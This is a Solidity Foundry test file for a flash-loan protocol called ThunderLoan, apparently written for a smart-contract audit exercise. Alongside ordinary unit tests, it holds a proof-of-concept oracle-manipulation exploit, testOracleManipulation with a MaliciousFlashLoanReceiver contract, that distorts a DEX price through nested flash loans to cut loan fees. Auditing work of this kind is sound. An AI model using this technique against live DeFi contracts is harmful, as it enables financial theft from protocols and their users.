// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

// import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { Test, console } from "forge-std/Test.sol";
// import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// import { Test, console } from "forge-std/Test.sol";
// // import { ThunderLoanTest, ThunderLoan } from "../unit/ThunderLoanTest.t.sol";
// import { ERC20Mock } from "../mocks/ERC20Mock.sol";
// import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
// import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }
    
    function testReedemAfterLoan() public setAllowedToken hasDeposits{
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountRedeemed=type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA,amountRedeemed);
    }

    function testOracleManipulation() public{
        //1.Contract Setups
        thunderLoan=new ThunderLoan();
        tokenA=new ERC20Mock();
        proxy=new ERC1967Proxy(address(thunderLoan),"");

        BuffMockPoolFactory pf=new BuffMockPoolFactory(address(weth));
        // create a TSwao DEX between weth and tokenA
        address tswapPool=pf.createPool(address(tokenA));
        thunderLoan=ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        //2.Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider,100e18);
        tokenA.approve(address(tswapPool),100e18);
        weth.mint(liquidityProvider,100e18);
        weth.approve(address(tswapPool),100e18);
        BuffMockTSwap(tswapPool).deposit(100e18,100e18,100e18, block.timestamp);
        //Now the Ration 100 WETH / 100 tokenA
        vm.stopPrank();

        //3.Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA,true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider,1000e18);
        tokenA.approve(address(thunderLoan),1000e18);
        thunderLoan.deposit(tokenA,1000e18);
        vm.stopPrank();
       
       // 100 tokenA & 100 weth in TSwap
       // 1000e18 tokenA in ThunderLoan
       // Take out a flash loan of 50 tokenA
       // swap it on the DEX,taking the price > 150 TokenA -> ~80  weth
       // Take out another flash loan of 50 tokenA (and we will see how much cheaper)

       //4.We are going to take 2 flash loans
       //  a.To nuke the price of the Weth/tokenA on tswap
       //  b.To show that doing greatly reduce the fee we pay on thunderloan

       uint256 normalFeeCost=thunderLoan.getCalculatedFee(tokenA,100e18);
       console.log(normalFeeCost);
       //0.296147410319118389 Now lets reduce this

       uint256 amountToBorrow=50e18; // we doign this twice
       MaliciousFlashLoanReceiver flr=new MaliciousFlashLoanReceiver(address(tswapPool),address(thunderLoan),address(thunderLoan.getAssetFromToken(tokenA)));
       vm.startPrank(user);
       tokenA.mint(address(flr),100e18);
       thunderLoan.flashloan(address(flr),tokenA,amountToBorrow,"");
       vm.stopPrank();

       uint256 attackFee=flr.feeOne()+flr.feeTwo();
       console.log("Attack Fee is : ", attackFee);
       assert(attackFee<normalFeeCost);
    }
    
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool,address _thunderloan,address _repayAddress){
        tswapPool=BuffMockTSwap(_tswapPool);
        thunderLoan=ThunderLoan(_thunderloan);
        repayAddress=_repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool){
        if(!attacked){
            //1.Swap a tokenA borrowed fo Weth
            //2.Take out another loan to show the fee difference
            feeOne=fee;
            attacked=true;
            uint256 wethBought=tswapPool.getOutputAmountBasedOnInput(50e18,100e18,100e18);
            IERC20(token).approve(address(tswapPool),50e18);
            tswapPool.swapWethForPoolTokenBasedOnInputWeth(50e18,wethBought,block.timestamp);
            //we call second flash loan
            thunderLoan.flashloan(address(this),IERC20(token),amount,"");
            //repay
            // IERC20(token).approve(address(thunderLoan),amount+fee);
            // thunderLoan.repay(IERC20(token),amount+fee);

            IERC20(token).transfer(address(repayAddress),amount+fee);
        } else{
            //calcalute te fee and pay
            feeTwo=fee;
            //repay
            // IERC20(token).approve(address(thunderLoan),amount+fee);
            // thunderLoan.repay(IERC20(token),amount+fee);
            IERC20(token).transfer(address(repayAddress),amount+fee);

        }
        return true;
    }

}

//IMPACT : Medium/Low : Users are getting chepaer fee
// LIKELYHOOD: High -> users 

